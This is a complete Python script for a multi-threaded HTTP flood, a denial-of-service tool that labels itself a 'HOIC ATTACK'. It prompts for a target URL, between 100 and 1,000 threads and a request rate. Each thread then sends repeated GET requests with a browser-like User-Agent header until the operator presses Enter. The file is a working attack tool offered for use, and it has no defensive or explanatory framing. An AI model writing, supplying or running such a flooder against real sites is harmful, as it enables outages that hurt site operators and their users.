import requests
import threading
import time
import random
import sys
from urllib.parse import urlparse

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def attack(target, speed, stop_event):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    while not stop_event.is_set():
        try:
            requests.get(target, headers=headers, timeout=4)
            time.sleep(1 / speed)
        except requests.exceptions.RequestException:
            pass
        except:
            break

# Get inputs
target = input("Target URL (http://example.com): ")
if not is_valid_url(target):
    print("Invalid URL format!")
    sys.exit(1)

try:
    threads = int(input("Threads (100-1000): "))
    if not 100 <= threads <= 1000:
        raise ValueError
except ValueError:
    print("Threads must be between 100-1000!")
    sys.exit(1)

try:
    speed = int(input("Speed (1-10): "))
    if not 1 <= speed <= 10:
        raise ValueError
except ValueError:
    print("Speed must be between 1-10!")
    sys.exit(1)

# Start attack
stop_event = threading.Event()
thread_list = []

for i in range(threads):
    t = threading.Thread(target=attack, args=(target, speed, stop_event))
    t.daemon = True
    t.start()
    thread_list.append(t)

print(f"🚀 HOIC ATTACK STARTED: {threads} threads on {target}")
print("Press Enter to STOP...")

input()
stop_event.set()
print("\n🛑 Attack stopped")